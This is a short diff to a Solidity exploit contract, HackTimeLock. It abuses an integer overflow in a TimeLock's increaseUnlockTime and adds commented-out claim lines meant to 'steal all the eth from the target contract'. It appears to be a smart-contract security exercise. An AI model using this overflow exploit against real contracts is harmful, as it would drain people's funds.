@@ -36,7 +36,10 @@ contract HackTimeLock {
         // therefore the unlocktime < block.timestamp when the hacks is carried out
         // seems like uint overflow is fixed in later version of solidity, it failed to run with solidity 0.8.7
         tl.increaseUnlockTime(x - 365 * 86400);
-        
+
+        // // call the claim funciton
+        // // this will steal all the eth from the target contract
+        // tl.claim{value: 1 ether}();
 
     }
     
